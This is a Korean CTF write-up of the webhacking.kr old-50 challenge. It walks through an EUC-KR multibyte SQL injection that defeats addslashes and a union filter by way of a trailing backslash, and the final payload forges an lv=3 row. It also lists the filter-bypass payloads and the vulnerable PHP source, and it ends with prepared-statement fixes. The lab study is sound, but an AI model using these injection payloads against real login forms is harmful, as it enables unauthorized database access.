---
title: "webhacking.kr old-50 풀이 — addslashes를 뚫는 EUC-KR 멀티바이트 SQL Injection"
description: "webhacking.kr old-50을 통해, addslashes와 mb_convert_encoding(euc-kr)이 만나 따옴표 방어가 거꾸로 무너지는 과정을 정리한다. 한 바이트(0xa1)로 백슬래시를 삼켜 id의 닫는 따옴표를 탈출시키고, union이 막힌 id 대신 pw 쪽으로 union select 3을 흘려보내 lv=3 행을 위조한다. 모든 오라클·페이로드는 추측이 아니라 실제 요청·응답으로 검증했다."
date: 2026-11-15
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, multibyte, euc-kr, addslashes, php, mysql]
---

[webhacking.kr](https://webhacking.kr)의 **old-50** 문제를 풀었다.
앞서 다룬 old-18·old-21이 "따옴표가 **그대로** 쿼리에 들어가는" 전형적인 인젝션이었다면,
old-50은 `addslashes()`로 따옴표를 **막아 둔** 로그인이다. 겉보기엔 방어가 되어 있다.

그런데 이 문제의 핵심은, 막아 둔 그 방어가 **멀티바이트 인코딩 변환 한 줄 때문에 거꾸로 뚫린다**는 점이다.
`addslashes()`가 따옴표 앞에 붙인 백슬래시(`\`)를, 바로 뒤의 `mb_convert_encoding(... , 'euc-kr')`이
**한 글자의 뒷바이트로 삼켜 버린다.** 그 결과 우리가 넣은 따옴표가 멀쩡히 살아남는다.

이 글은 추측이 아니라 **공개된 소스를 읽고, 실제로 서버에 요청을 보내 각 응답을 관찰하고,
최종 페이로드로 통과한 뒤 `chall.php`에서 `✔️ old-50`으로 바뀐 것까지 확인** 한 과정을 그대로 정리한다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-50 (`/challenge/web-25/`) |
| 배점 | 45점 |
| 유형 | SQL Injection (EUC-KR 멀티바이트 `addslashes` 우회) |
| 목표 | 쿼리 결과의 `lv`가 `3`인 행을 만들어 `solve()` 통과 |

화면에는 `SQL INJECTION` 이라는 제목과 **id / pw 입력창** 뿐이고, 폼은 값을 `GET`으로 보낸다.
그리고 고맙게도 **소스가 공개**되어 있다(`?view_source=1`).

## 2. 소스 분석 — 방어 코드와 그 틈

```php
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']);
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');   // ← id 에만 적용
    foreach($_GET as $ck) if(preg_match("/from|pw|\(|\)| |%|=|>|</i",$ck)) exit();
    if(preg_match("/union/i",$_GET['id'])) exit();                     // ← union 은 id 에만 금지
    $result = mysqli_fetch_array(mysqli_query($db,
      "select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      if($result['lv']==1) echo("level : 1<br><br>");
      if($result['lv']==2) echo("level : 2<br><br>");
    }
    if($result['lv']=="3") solve(50);     // ← 첫 행의 lv 가 3 이면 통과
    if(!$result) echo("Wrong");
  }
?>
```

방어 장치를 정리하면 이렇다.

1. **`addslashes($id)`, `addslashes($pw)`** — 따옴표(`'` `"`)와 백슬래시(`\`) 앞에 `\`를 붙여 이스케이프한다. 평범하게는 문자열을 탈출할 수 없다.
2. **`mb_convert_encoding($id,'utf-8','euc-kr')`** — `id`만, `addslashes` **뒤에** EUC-KR → UTF-8 변환을 거친다. **바로 이 한 줄이 틈이다.**
3. **문자 블랙리스트** — 모든 파라미터에서 `from` `pw` `(` `)` 공백 `%` `=` `>` `<` 가 하나라도 있으면 `exit()`.
4. **`union` 금지** — 단, **`$_GET['id']`에만** 적용된다. `pw`에는 걸려 있지 않다.

그리고 통과 조건은 **조회된 첫 행의 `lv`가 `3`** 인 것.

## 3. 먼저 확인한 사실들 (실제 응답)

소스만 믿지 않고, 응답으로 하나씩 확인했다.

| 요청 | 응답 | 해석 |
| --- | --- | --- |
| `?id=guest&pw=guest` | `level : 1` | guest 는 `lv=1` |
| `?id=admin&pw=x` | `Wrong` | admin 비번 불일치(또는 없음) → 행 없음 |
| `?id=%a1%27or/**/1%23` | `level : 1` | **멀티바이트 우회 성립** — 따옴표가 살아남아 `or 1`이 먹힘 |
| `?id=%a1%27or/**/lv/**/like/**/1%23` | `level : 1` | `lv=1` 행 존재 |
| `?id=%a1%27or/**/lv/**/like/**/2%23` | `level : 2` | `lv=2` 행 존재 |
| `?id=%a1%27or/**/lv/**/like/**/3%23` | `Wrong` | **`lv=3` 행은 아예 없다** |

여기서 두 가지가 확정됐다.

- 블랙리스트 때문에 **공백 대신 `/**/`(주석), `=` 대신 `like`, 주석은 `#`(`%23`)** 를 쓰면 통과한다.
- **`lv=3`인 행은 존재하지 않는다.** 즉 단순히 "admin으로 로그인"하는 문제가 아니라, **없는 행(lv=3)을 직접 만들어 내야** 한다. → `union select 3`이 필요하다.

## 4. 멀티바이트 우회 — 0xa1이 백슬래시를 삼킨다

`?id=%a1%27`(바이트 `0xA1 0x27`)이 어떻게 따옴표를 살려 내는지 **바이트 단위로** 보자.

```text
입력 id         :  0xA1 0x27            (%a1 + ' )
addslashes 후   :  0xA1 0x5C 0x27       ( ' 앞에 \(0x5C) 삽입 )
euc-kr→utf-8 후 :  <한 글자> 0x27        ( 0xA1 0x5C 를 한 EUC-KR 문자로 보고 변환 → 0x5C 소멸 )
```

EUC-KR에서 **0xA1은 2바이트 문자의 첫 바이트(lead byte)** 다. 변환기는 `0xA1` 다음의 `0x5C`를
**뒷바이트로 묶어 한 글자로 변환**해 버린다. 그 바람에 `addslashes`가 심어 둔 `0x5C`(백슬래시)가 사라지고,
**이스케이프를 잃은 `0x27`(따옴표)만 덩그러니 남는다.** 방어가 거꾸로 공격자의 따옴표를 복구해 준 셈이다.

그래서 `?id=%a1%27or/**/1%23` 의 실제 쿼리는 이렇게 된다.

```sql
select lv from chall50 where id='뀀' or 1 #...' and pw=md5('x')
```

따옴표가 살아 있으니 `or 1`이 붙고, `#`가 뒤를 지운다. `level : 1`이 돌아온 것이 그 증거다.

## 5. 핵심 벽 — union은 id에서 막혀 있다

`lv=3` 행을 위조하려면 `union select 3`이 필요한데, `union`은 `$_GET['id']`에서 금지다.

```text
?id=%a1%27union/**/select/**/3%23&pw=x   → (폼만 출력, 통과 없음) : preg_match("/union/i",id) 에 걸려 exit()
```

실제로 **id에 union을 넣으면 걸려서 멈춘다.** 그런데 소스를 다시 보면 `union` 검사는 **id에만** 있다.
**`pw`에는 union을 써도 된다.** 문제는 "`pw`는 `addslashes`만 거치고 멀티바이트 변환이 없어서, 따옴표를 탈출할 수 없다"는 점이다.

→ 그러면 **`id` 쪽에서 쿼리의 구조를 열어, `pw`가 들어가는 자리를 "문자열 안"이 아니라 "SQL 코드"로 만들면** 된다.

## 6. 트레일링 백슬래시 병합 — pw를 SQL 코드로 끌어내기

이번엔 `id`의 끝에 **백슬래시 하나**를 남긴다. `?id=%a1%5c`(바이트 `0xA1 0x5C`)를 보자.

```text
입력 id         :  0xA1 0x5C
addslashes 후   :  0xA1 0x5C 0x5C       ( \(0x5C) 앞에 \ 삽입 → \\ )
euc-kr→utf-8 후 :  <한 글자> 0x5C        ( 0xA1 0x5C 를 한 글자로 흡수 → 백슬래시 하나만 생존 )
```

끝에 **단독 백슬래시 `\`** 가 남는다. 이게 쿼리에서 `id`의 **닫는 따옴표를 이스케이프**한다.

```sql
select lv from chall50 where id='…\' and pw=md5('<PW>')
```

`'…\'` 에서 `\'`가 따옴표를 문자로 만들어 버리니, 문자열은 거기서 끝나지 않고
**` and pw=md5('` 까지 통째로 문자열 안으로 빨려 들어간다.** 그 문자열을 닫는 것은 `md5('`의 여는 따옴표다.
결국 그 따옴표 **뒤에 오는 `<PW>`는 문자열이 아니라 날 것의 SQL** 이 된다.

이제 `pw`에 `union select 3`을 넣는다. (공백은 `/**/`, 끝은 `#`=`%23`)

```text
?id=%a1%5c&pw=/**/union/**/select/**/3%23
```

조립된 최종 쿼리를 분해하면 이렇다.

```sql
select lv from chall50
where id='뀀\' and pw=md5('   -- 여기까지가 하나의 문자열 리터럴
       /**/union/**/select/**/3   -- pw 가 SQL 코드로 탈출
       #')                        -- # 가 남은 ')  를 주석 처리
```

즉 `where id='…'` 는 아무 행도 못 찾고, **`union select 3`이 `lv=3`짜리 행 하나를 새로 만들어** 낸다.
`mysqli_fetch_array`는 그 첫 행을 집어 오고, `$result['lv']`는 `3` — **`solve(50)` 조건이 충족된다.**

> `pw`는 `addslashes`만 거쳐 따옴표를 못 넘지만, **`id`의 백슬래시가 따옴표의 경계 자체를 옮겨** 버리면
> `pw`는 더 이상 문자열 안이 아니다. 방어 두 개(`addslashes` + `union` 필터)가 각자 자기 자리만 지키다가, **경계가 움직이자 함께 무너졌다.**

## 7. 결과 — lv=3 위조로 통과

```text
GET /challenge/web-25/?id=%a1%5c&pw=/**/union/**/select/**/3%23
→ level/Wrong 어느 쪽도 출력되지 않음 (lv==3 분기 → solve())
```

통과 직후 `chall.php`를 확인하니 해당 칸이 **`✔️ old-50`** 으로 바뀌어 있었다.
같은 요청을 다시 보내면 이미 푼 상태라 이렇게 응답한다.

```html
<script>alert('already solved');</script>
```

`level : …`도 `Wrong`도 아닌 결과, 그리고 `chall.php`의 `✔️` — **lv=3 행 위조가 실제로 먹혔다는** 증거다.

## 8. 왜 취약한가 — 그리고 올바른 방어

**(1) `addslashes` + 멀티바이트 변환은 궁합이 최악이다.**
`addslashes`는 **바이트 단위**로 따옴표 앞에 `\`를 붙일 뿐, 인코딩을 모른다.
그 뒤에 `mb_convert_encoding(...,'euc-kr')`이 끼면, 방금 붙인 `\`가 **앞 바이트에 흡수되어 사라지거나(따옴표 생존)**,
우리가 심은 `\`가 **그대로 살아 남아 경계를 민다(병합).** 방어가 공격 도구로 뒤집히는 전형적인 **멀티바이트 SQLi**다.

**(2) 블랙리스트·부분 필터는 반드시 샌다.**
`union`을 `id`에서만 막고 `pw`는 열어 둔 순간, 공격은 열린 쪽으로 흐른다.
공백도 `/**/`로, `=`도 `like`로 우회된다. **"무엇을 금지할지"를 나열하는 방식은 질 수밖에 없다.**

**(3) 근본 해법은 Prepared Statement.**
입력을 쿼리 **문자열에 섞지 않고** 데이터로만 바인딩하면, 따옴표가 살아남든 백슬래시가 남든 **구조는 바뀌지 않는다.**

```php
// 안전한 로그인: 입력은 데이터로만, 인코딩은 커넥션에서 일관되게
mysqli_set_charset($db, 'utf8mb4');          // ① 커넥션 charset 을 명확히 고정
$stmt = $db->prepare(
  "select lv from chall50 where id=? and pw=?");
$stmt->bind_param("ss", $_GET['id'], hash('md5', $_GET['pw']));  // ② id·pw 는 바인딩
$stmt->execute();
$result = $stmt->get_result()->fetch_assoc();
```

이스케이프가 꼭 필요하면 `addslashes`가 아니라 **charset을 아는** `mysqli_real_escape_string($db, ...)`를,
그것도 `mysqli_set_charset()`으로 커넥션 인코딩을 맞춘 뒤에 써야 한다. `addslashes`를 멀티바이트 변환과 섞지 않는다.

## 9. 정리

- old-50은 `addslashes`로 따옴표를 막아 두지만, 바로 뒤 **`mb_convert_encoding(..., 'euc-kr')`** 때문에 뚫리는 **멀티바이트 SQL Injection** 이다.
- `%a1%27` → `0xA1`이 뒤의 백슬래시를 **뒷바이트로 삼켜** `addslashes`가 심은 이스케이프를 지우고 **따옴표를 복구**한다.
- 통과 조건인 **`lv=3` 행은 존재하지 않아** `union select 3`으로 **직접 위조**해야 한다.
- `union`은 `id`에서만 금지 → `?id=%a1%5c`로 **트레일링 백슬래시**를 남겨 `id`의 닫는 따옴표를 탈출시키고, union이 허용된 **`pw`를 SQL 코드로 끌어내** `union select 3`을 꽂았다.
- 최종 `?id=%a1%5c&pw=/**/union/**/select/**/3%23` 로 통과(`✔️ old-50`)를 확인했다.
- 방어는 **Prepared Statement**, **커넥션 charset 고정(`mysqli_set_charset`)**, **블랙리스트 대신 화이트리스트·바인딩**.

> `addslashes` 한 줄로 "따옴표는 막았다"고 믿는 순간이 이 문제의 함정이다.
> 방어가 **인코딩을 모른 채** 바이트만 만지면, 그 방어가 붙여 둔 백슬래시가 바로 공격자의 손잡이가 된다.
